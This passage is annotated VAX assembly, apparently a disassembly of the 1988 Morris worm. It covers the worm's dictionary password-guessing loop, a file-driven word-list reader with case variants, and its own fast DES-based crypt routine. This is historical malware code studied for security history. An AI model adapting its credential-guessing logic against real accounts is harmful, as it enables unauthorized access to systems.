	beql	LL73
	incl	-0x8(fp)
	brb	LL74
LL73:
	pushl	$0x4
	pushl	-0x8(fp)
	pushl	$_wds	#  global sym _wds#
	calls	$0x3,_permute	#  global routine _permute#
LL72:
	clrf	-0xC(fp)
LL76:
	movl	_nextw,r0	#  global sym _nextw#
	movl	_wds[r0],r0	#  global sym _wds#
	movl	-0xC(fp),r1
	tstb	(r0)[r1]
	beql	LL75
	movl	_nextw,r0	#  global sym _nextw#
	movl	_wds[r0],r0	#  global sym _wds#
	movl	-0xC(fp),r1
	cvtbl	(r0)[r1],r2
	bicl2	$0x80,r2
	cvtlb	r2,(r0)[r1]
	incl	-0xC(fp)
	brb	LL76
LL75:
	movl	_h_errno+0x2810,-0x4(fp)	#  global bss segment#
LL78:
	tstl	-0x4(fp)
	beql	LL77
	movl	_nextw,r0	#  global sym _nextw#
	pushl	_wds[r0]	#  global sym _wds#
	pushl	-0x4(fp)
	calls	$0x2,0x3D88
	movl	-0x4(fp),r0
	movl	0x38(r0),-0x4(fp)
	brb	LL78
LL77:
	clrf	-0xC(fp)
LL80:
	movl	_nextw,r0	#  global sym _nextw#
	movl	_wds[r0],r0	#  global routine _wds#
	movl	-0xC(fp),r1
	tstb	(r0)[r1]
	beql	LL79
	movl	_nextw,r0	#  global sym _nextw#
	movl	_wds[r0],r0	#  global sym _wds#
	movl	-0xC(fp),r1
	cvtbl	(r0)[r1],r2
	bisl2	$0x80,r2
	cvtlb	r2,(r0)[r1]
	incl	-0xC(fp)
	brb	LL80
LL79:
	incl	_nextw	#  global sym _nextw#
	ret
LL70:
	subl2	$0xC,sp
	brw	LL81
	halt
	halt
	brw	LL82
LL89:
	tstl	_h_errno+0x2818	#  global bss segment#
	bneq	LL83
	pushl	$_other_fd+0xAB	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	pushl	$_other_fd+0x9B	#  global data segment#
	calls	$0x1,_XS	#  global routine _XS#
	pushl	r0
	calls	$0x2,_fopen	#  global routine _fopen#
	movl	r0,_h_errno+0x2818	#  global bss segment#
	tstl	_h_errno+0x2818	#  global bss segment#
	bneq	LL83
	ret
LL83:
	pushl	_h_errno+0x2818	#  global bss segment#
	pushl	$0x200
	subl3	$0x200,fp,r0
	pushl	r0
	calls	$0x3,_fgets	#  global routine _fgets#
	tstl	r0
	bneq	LL84
	incl	_cmode	#  global sym _cmode#
	ret
LL84:
	subl3	$0x200,fp,r0
	pushl	r0
	calls	$0x1,_strlen	#  global routine _strlen#
	decl	r0
	subl3	$0x200,fp,r1
	addl2	r1,r0
	movl	r0,-0x208(fp)
	clrb	*-0x208(fp)
	movl	_h_errno+0x2810,-0x204(fp)	#  global bss segment#
LL86:
	tstl	-0x204(fp)
	beql	LL85
	subl3	$0x200,fp,r0
	pushl	r0
	pushl	-0x204(fp)
	calls	$0x2,0x3D88
	movl	-0x204(fp),r0
	movl	0x38(r0),-0x204(fp)
	brb	LL86
LL85:
	cvtbl	-0x200(fp),r0
	bitb	$0x1,__ctype_+0x1[r0]	#  global data segment#
	beql	LL87
	cvtbl	-0x200(fp),r0
	addl2	$0x20,r0
	cvtlb	r0,-0x200(fp)
	movl	_h_errno+0x2810,-0x204(fp)	#  global bss segment#
LL88:
	tstl	-0x204(fp)
	beql	LL87
	subl3	$0x200,fp,r0
	pushl	r0
	pushl	-0x204(fp)
	calls	$0x2,0x3D88
	movl	-0x204(fp),r0
	movl	0x38(r0),-0x204(fp)
	brb	LL88
LL87:
	ret
LL82:
	movab	-0x208(sp),sp
	brw	LL89
####  END PROC ####

#### start of global routine "_crypt" ####
	.data
	.text
	.align	1
	.globl	 _crypt
_crypt:
	.word	S63
	.set	S63,0xE00
	subl2	$0x8,sp
	clrf	_h_errno+0x282C	#  global bss segment#
	clrf	_h_errno+0x2830	#  global bss segment#
	clrf	r11
LL0:
	movb	_other_fd+0xB0[r11],_E[r11]	#  global data segment global sym _E#
	aoblss	$0x30,r11,LL0
	clrf	r11
	brb	LL1
LL4:
	cmpl	r11,$0x20
	bgeq	LL2
	clrf	r10
LL3:
	subl3	r10,$0x6,r0
	mnegl	r0,r0
	ashl	r0,r9,r0
	extzv	$0x0,$0x1,r0,-0x8(fp)
	subl3	r11,$0x1F,r0
	ashl	r0,-0x8(fp),r0
	bisl2	r0,_h_errno+0x282C	#  global bss segment#
	incl	r10
	incl	r11
	cmpl	r10,$0x7
	blss	LL3
	incl	r11
	incl	0x4(ap)
LL1:
	cvtbl	*0x4(ap),r9
	bneq	LL4
LL2:
	clrf	r11
	brb	LL5
LL8:
	cmpl	r11,$0x20
	bgeq	LL6
	clrf	r10
LL7:
	subl3	r10,$0x6,r0
	mnegl	r0,r0
	ashl	r0,r9,r0
	extzv	$0x0,$0x1,r0,-0x8(fp)
	subl3	r11,$0x1F,r0
	ashl	r0,-0x8(fp),r0
	bisl2	r0,_h_errno+0x2830	#  global bss segment#
	incl	r10
	incl	r11
	cmpl	r10,$0x7
	blss	LL7
	incl	r11
	incl	0x4(ap)
LL5:
	cvtbl	*0x4(ap),r9
	bneq	LL8
LL6:
	pushl	$0x0
	pushaf	_h_errno+0x282C	#  global bss segment#
	calls	$0x2,_compkeys	#  global routine _compkeys#
	clrf	r11
LL13:
	cvtbl	*0x8(ap),r9
	incl	0x8(ap)
	cvtlb	r9,_h_errno+0x281C[r11]	#  global bss segment#
	cmpl	r9,$0x5A
	bleq	LL9
	subl2	$0x6,r9
LL9:
	cmpl	r9,$0x39
	bleq	LL10
	subl2	$0x7,r9
LL10:
	subl2	$0x2E,r9
	clrf	r10
LL12:
	mnegl	r10,r0
	ashl	r0,r9,r0
	blbc	r0,LL11
	mull3	$0x6,r11,r0
	addl2	r10,r0
	cvtbl	_E[r0],-0x4(fp)	#  global sym _E#
	mull3	$0x6,r11,r0
	addl2	r10,r0
	mull3	$0x6,r11,r1
	addl2	r10,r1
	movb	_E+0x18[r0],_E[r1]	#  global bss segment global sym _E#
	mull3	$0x6,r11,r0
	addl2	r10,r0
	cvtlb	-0x4(fp),_E+0x18[r0]	#  global bss segment#
LL11:
	incl	r10
	cmpl	r10,$0x6
	blss	LL12
	incl	r11
	cmpl	r11,$0x2
	blss	LL13
	calls	$0x0,_mungE	#  global routine _mungE#
	clrf	_h_errno+0x282C	#  global bss segment#
	clrf	_h_errno+0x2830	#  global bss segment#
	pushaf	_h_errno+0x282C	#  global bss segment#
	pushaf	_h_errno+0x282C	#  global bss segment#
	calls	$0x2,_des	#  global routine _des#
	pushaf	_h_errno+0x282C	#  global bss segment#
	pushaf	_h_errno+0x282C	#  global bss segment#
	calls	$0x2,_ipi	#  global routine _ipi#
	clrf	r11
LL16:
	movl	_h_errno+0x282C,r0	#  global bss segment#
	extzv	$0x1A,$0x6,r0,r9
	ashl	$0x6,r0,_h_errno+0x282C	#  global bss segment#
	movl	_h_errno+0x2830,r0	#  global bss segment#
	extzv	$0x1A,$0x6,r0,r0
	bisl2	r0,_h_errno+0x282C	#  global bss segment#
	ashl	$0x6,_h_errno+0x2830,_h_errno+0x2830	#  global bss segment global bss segment#
	addl2	$0x2E,r9
	cmpl	r9,$0x39
	bleq	LL14
	addl2	$0x7,r9
LL14:
	cmpl	r9,$0x5A
	bleq	LL15
	addl2	$0x6,r9
LL15:
	cvtlb	r9,_h_errno+0x281E[r11]	#  global bss segment#
	incl	r11
	cmpl	r11,$0xB
	blss	LL16
	clrb	_h_errno+0x281E[r11]	#  global bss segment#
	tstb	_h_errno+0x281D	#  global bss segment#
	bneq	LL17
	movb	_h_errno+0x281C,_h_errno+0x281D	#  global bss segment global bss segment#
LL17:
	movaf	_h_errno+0x281C,r0	#  global bss segment#
	ret
####  END PROC ####

#### start of global routine "_mungE" ####
	.data
	.text
	.align	1
	.globl	 _mungE
_mungE:
	.word	S65
	.set	S65,0xFC0
	subl2	$0x8,sp
	clrf	r11
LL1:
	ashl	$0x6,r11,r0
	movab	_E_H[r0],-0x4(fp)	#  global sym _E_H#
	ashl	$0x6,r11,r0
	movab	_E_L[r0],-0x8(fp)	#  global sym _E_L#
	clrf	r10
LL0:
	movl	-0x4(fp),r0
	addl2	$0x4,-0x4(fp)
	clrf	(r0)
	movl	(r0),*-0x8(fp)
	addl2	$0x4,-0x8(fp)
	aoblss	$0x10,r10,LL0
	incl	r11
	cmpl	r11,$0x8
	blss	LL1
	clrf	r10
LL4:
	subl3	r10,$0x1F,r0
	ashl	r0,$0x1,r6
	movl	$0x1F,r0
	cvtbl	_E[r10],r1	#  global sym _E#
	subl3	r1,r0,r9
	extzv	$0x0,$0x2,r9,r0
	ashl	r0,$0x1,r8
	ashl	$-0x2,r9,r7
	ashl	$0x6,r7,r0
	movab	_E_L[r0],-0x4(fp)	#  global sym _E_L#
	movl	$0x1,r11
LL3:
	mcoml	r8,r0
	bicl3	r0,r11,r0
	beql	LL2
	bisl2	r6,*-0x4(fp)[r11]
LL2:
	aoblss	$0x10,r11,LL3
	incl	r10
	cmpl	r10,$0x20
	blss	LL4
	movl	$0x20,r10
LL7:
	subl3	r10,$0x3F,r0
	ashl	r0,$0x1,r6
	movl	$0x1F,r0
	cvtbl	_E[r10],r1	#  global sym _E#
	subl3	r1,r0,r9
	extzv	$0x0,$0x2,r9,r0
	ashl	r0,$0x1,r8
	ashl	$-0x2,r9,r7
	ashl	$0x6,r7,r0
	movab	_E_H[r0],-0x4(fp)	#  global sym _E_H#
	movl	$0x1,r11
LL6:
	mcoml	r8,r0
	bicl3	r0,r11,r0
	beql	LL5
	bisl2	r6,*-0x4(fp)[r11]
LL5:
	aoblss	$0x10,r11,LL6
	incl	r10
	cmpl	r10,$0x30
	blss	LL7
	ret
####  END PROC ####

#### start of global routine "_compkeys" ####
	.data
	.text
	.align	1
	.globl	 _compkeys
_compkeys:
	.word	S67
	.set	S67,0xFC0
	subl2	$0x10,sp
	clrf	r11
	clrf	r10
	clrf	r7
	movl	0x4(ap),r0
	movl	0x4(r0),r6
LL1:
	tstl	r6
	bgeq	LL0
	bisl2	_PC1[r7],r11	#  global sym _PC1#
	addl3	$0x1,r7,r0
	bisl2	_PC1[r0],r10	#  global sym _PC1#
LL0:
	addl2	r6,r6
	addl2	$0x2,r7
	cmpl	r7,$0x40
	blss	LL1
	movl	*0x4(ap),r6
	brb	LL2
LL4:
	tstl	r6
	bgeq	LL3
	bisl2	_PC1[r7],r11	#  global sym _PC1#
	addl3	$0x1,r7,r0
	bisl2	_PC1[r0],r10	#  global sym _PC1#
LL3:
	addl2	r6,r6
	addl2	$0x2,r7
LL2:
	cmpl	r7,$0x80
	blss	LL4
	clrf	-0x4(fp)
LL18:
	clrf	r6
	brb	LL5
LL9:
	clrf	-0x8(fp)
	clrf	-0xC(fp)
	clrf	-0x10(fp)
	tstl	r11
	bgeq	LL6
	movl	$0x10,-0x8(fp)
LL6:
	bbc	$0x3,r11,LL7
	cvtwl	$0x100,-0xC(fp)
LL7:
	tstl	r10
	bgeq	LL8
	movl	$0x1,-0x10(fp)
LL8:
	addl2	r11,r11
	bicl2	$0x10,r11
	bisl2	-0x8(fp),r11
	bisl2	-0x10(fp),r11
	addl2	r10,r10
	bisl2	-0xC(fp),r10
	incl	r6
LL5:
	movl	-0x4(fp),r0
	cmpl	r6,_shift[r0]	#  global sym _shift#
	blss	LL9
	clrf	r9
	clrf	r8
	clrf	r7
	movl	r10,r6
LL11:
	tstl	r6
	bgeq	LL10
	bisl2	_PC2[r7],r9	#  global sym _PC2#
	addl3	$0x1,r7,r0
	bisl2	_PC2[r0],r8	#  global sym _PC2#
LL10:
	addl2	r6,r6
	addl2	$0x2,r7
	cmpl	r7,$0x40
	blss	LL11
	movl	r11,r6
	brb	LL12
LL14:
	tstl	r6
	bgeq	LL13
	bisl2	_PC2[r7],r9	#  global sym _PC2#
	addl3	$0x1,r7,r0
	bisl2	_PC2[r0],r8	#  global sym _PC2#
LL13:
	addl2	r6,r6
	addl2	$0x2,r7
LL12:
	cmpl	r7,$0x80
	blss	LL14
	tstl	0x8(ap)
	beql	LL15
	subl3	-0x4(fp),$0xF,r0
	movl	r9,_keys_L[r0]	#  global sym _keys_L#
	subl3	-0x4(fp),$0xF,r0
	brb	LL16
LL15:
	movl	-0x4(fp),r0
	movl	r9,_keys_L[r0]	#  global sym _keys_L#
	movl	-0x4(fp),r0
LL16:
	movl	r8,_keys_H[r0]	#  global sym _keys_H#
	incl	-0x4(fp)
	cmpl	-0x4(fp),$0x10
	bgeq	LL17
	brw	LL18
LL17:
	ret
####  END PROC ####

#### start of global routine "_setupE" ####
	.data
	.text
	.align	1
	.globl	 _setupE
_setupE:
	.word	S69
	.set	S69,0x0
	subl2	$0xC,sp
	clrf	-0x4(fp)
LL1:
	clrf	-0x8(fp)
LL0:
	movl	-0x8(fp),r0
	ashl	$0x6,-0x4(fp),r1
	addl2	$_E_L,r1	#  global sym _E_L#
	ashl	$0x2,r0,r0
	addl2	r0,r1
	clrf	(r1)
	movl	-0x8(fp),r0
	ashl	$0x6,-0x4(fp),r2
	addl2	$_E_H,r2	#  global sym _E_H#
	ashl	$0x2,r0,r0
	addl2	r0,r2
	movl	(r1),(r2)
	incl	-0x8(fp)
	cmpl	-0x8(fp),$0x10
	blss	LL0
	incl	-0x4(fp)
	cmpl	-0x4(fp),$0x8
	blss	LL1
	clrf	-0x8(fp)
LL4:
	movl	-0x8(fp),r0
	movl	$0x1F,r1
	cvtbl	_E[r0],r0	#  global sym _E#
	subl3	r0,r1,-0xC(fp)
	clrf	-0x4(fp)
LL3:
	divl3	$0x4,-0xC(fp),r0
	ashl	$0x2,r0,r0
	subl3	r0,-0xC(fp),r0
	ashl	r0,$0x1,r0
	mcoml	r0,r0
	bicl3	r0,-0x4(fp),r0
	beql	LL2
	subl3	-0x8(fp),$0x1F,r0
	ashl	r0,$0x1,r0
	movl	-0x4(fp),r1
	divl3	$0x4,-0xC(fp),r2
	ashl	$0x6,r2,r2
	addl2	$_E_L,r2	#  global sym _E_L#
	ashl	$0x2,r1,r1
	addl2	r1,r2
	bisl2	r0,(r2)
LL2:
	incl	-0x4(fp)
	cmpl	-0x4(fp),$0x10
	blss	LL3
	incl	-0x8(fp)
	cmpl	-0x8(fp),$0x20
	blss	LL4
	movl	$0x20,-0x8(fp)
LL7:
	movl	-0x8(fp),r0
	movl	$0x1F,r1
	cvtbl	_E[r0],r0	#  global sym _E#
	subl3	r0,r1,-0xC(fp)
	clrf	-0x4(fp)
LL6:
	divl3	$0x4,-0xC(fp),r0
	ashl	$0x2,r0,r0
	subl3	r0,-0xC(fp),r0
	ashl	r0,$0x1,r0
	mcoml	r0,r0
	bicl3	r0,-0x4(fp),r0
	beql	LL5
	subl3	-0x8(fp),$0x3F,r0
	ashl	r0,$0x1,r0
	movl	-0x4(fp),r1
	divl3	$0x4,-0xC(fp),r2
	ashl	$0x6,r2,r2
	addl2	$_E_H,r2	#  global sym _E_H#
	ashl	$0x2,r1,r1
	addl2	r1,r2
	bisl2	r0,(r2)
LL5:
	incl	-0x4(fp)
	cmpl	-0x4(fp),$0x10
	blss	LL6
	incl	-0x8(fp)
	cmpl	-0x8(fp),$0x30
	blss	LL7
	ret
####  END PROC ####

#### start of global routine "_des" ####
	.data
	.text
	.align	1
	.globl	 _des
_des:
	.word	S71
	.set	S71,0xFC0
	subl2	$0x10,sp
	movl	*0x4(ap),-0x4(fp)
	movl	0x4(ap),r0
	movl	0x4(r0),r6
	clrf	-0x10(fp)
LL3:
	movaf	_keys_L,-0x8(fp)	#  global sym _keys_L#
	movaf	_keys_H,-0xC(fp)	#  global sym _keys_H#
	clrf	r7
LL1:
	movl	r6,r9
	extzv	$0x0,$0x4,r9,r8
	movl	_E_L[r8],r11	#  global sym _E_L#
	movl	_E_H[r8],r10	#  global sym _E_H#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x40[r8],r11	#  global bss segment#
	bisl2	_E_H+0x40[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x80[r8],r11	#  global bss segment#
	bisl2	_E_H+0x80[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0xC0[r8],r11	#  global bss segment#
	bisl2	_E_H+0xC0[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x100[r8],r11	#  global bss segment#
	bisl2	_E_H+0x100[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x140[r8],r11	#  global bss segment#
	bisl2	_E_H+0x140[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x180[r8],r11	#  global bss segment#
	bisl2	_E_H+0x180[r8],r10	#  global bss segment#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r8
	bisl2	_E_L+0x1C0[r8],r11	#  global bss segment#
	bisl2	_E_H+0x1C0[r8],r10	#  global bss segment#
	xorl2	*-0x8(fp),r11
	addl2	$0x4,-0x8(fp)
	xorl2	*-0xC(fp),r10
	addl2	$0x4,-0xC(fp)
	extzv	$0x10,$0x10,r10,r0
	extzv	$0x0,$0x6,r0,r0
	movl	_SP0[r0],r9	#  global sym _SP0#
	extzv	$0x16,$0xA,r10,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP1[r0],r9	#  global sym _SP1#
	extzv	$0x0,$0x2,r11,r0
	ashl	$0x4,r0,r0
	extzv	$0x1C,$0x4,r10,r1
	extzv	$0x0,$0x4,r1,r1
	bisl2	r1,r0
	bisl2	_SP2[r0],r9	#  global sym _SP2#
	extzv	$0x2,$0x1E,r11,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP3[r0],r9	#  global sym _SP3#
	extzv	$0x8,$0x18,r11,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP4[r0],r9	#  global sym _SP4#
	extzv	$0xE,$0x12,r11,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP5[r0],r9	#  global sym _SP5#
	extzv	$0x14,$0xC,r11,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP6[r0],r9	#  global sym _SP6#
	extzv	$0x1A,$0x6,r11,r0
	extzv	$0x0,$0x6,r0,r0
	bisl2	_SP7[r0],r9	#  global sym _SP7#
	movl	-0x4(fp),r10
	movl	r6,-0x4(fp)
	xorl3	r9,r10,r6
	incl	r7
	cmpl	r7,$0x10
	bgeq	LL0
	brw	LL1
LL0:
	movl	-0x4(fp),r9
	movl	r6,-0x4(fp)
	movl	r9,r6
	incl	-0x10(fp)
	cmpl	-0x10(fp),$0x19
	bgeq	LL2
	brw	LL3
LL2:
	movl	-0x4(fp),*0x8(ap)
	movl	0x8(ap),r0
	movl	r6,0x4(r0)
	ret
####  END PROC ####

#### start of global routine "_ipi" ####
	.data
	.text
	.align	1
	.globl	 _ipi
_ipi:
	.word	S73
	.set	S73,0xF00
	movl	*0x4(ap),r9
	extzv	$0x0,$0x4,r9,r0
	movl	_ipi_L0[r0],r11	#  global sym _ipi_L0#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	movl	_ipi_H1[r0],r10	#  global sym _ipi_H1#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_L2[r0],r11	#  global sym _ipi_L2#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_H3[r0],r10	#  global sym _ipi_H3#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_L4[r0],r11	#  global sym _ipi_L4#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_H5[r0],r10	#  global sym _ipi_H5#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_L6[r0],r11	#  global sym _ipi_L6#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_H7[r0],r10	#  global sym _ipi_H7#
	movl	0x4(ap),r0
	movl	0x4(r0),r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_L8[r0],r11	#  global sym _ipi_L8#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_H9[r0],r10	#  global sym _ipi_H9#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_La[r0],r11	#  global sym _ipi_La#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_Hb[r0],r10	#  global sym _ipi_Hb#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_Lc[r0],r11	#  global sym _ipi_Lc#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_Hd[r0],r10	#  global sym _ipi_Hd#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_Le[r0],r11	#  global sym _ipi_Le#
	extzv	$0x4,$0x1C,r9,r9
	extzv	$0x0,$0x4,r9,r0
	bisl2	_ipi_Hf[r0],r10	#  global sym _ipi_Hf#
	movl	r11,*0x8(ap)
	movl	0x8(ap),r0
	movl	r10,0x4(r0)
	ret
	halt
	halt
	halt
	jmp	LL0	#  global sym cerro#
	halt
	halt
####  END PROC ####

#### start of global routine "_fork" ####
	.data
	.text
	.align	1
	.globl	 _fork
_fork:
	.word	S75
	.set	S75,0x0
	chmk	$0x2
	blssu	LL0
	blbc	r1,LL1
	clrf	r0
LL1:
	ret
	jmp	LL2	#  global sym cerro#
	halt
	halt
####  END PROC ####

#### start of global routine "_getpgrp"	####
	.data
	.text
	.align	1
	.globl	 _getpgrp
_getpgrp:
	.word	S77
	.set	S77,0x0
	chmk	$0x51
	blssu	LL0
	ret
	halt
	halt
	halt
	jmp	LL1	#  global sym cerro#
	halt
	halt
####  END PROC ####

#### start of global routine "_kill" ####
	.data
	.text
	.align	1
	.globl	 _kill
_kill:
	.word	S79
	.set	S79,0x0
	chmk	$0x25
	blssu	LL0
	ret
	halt
####  END PROC ####

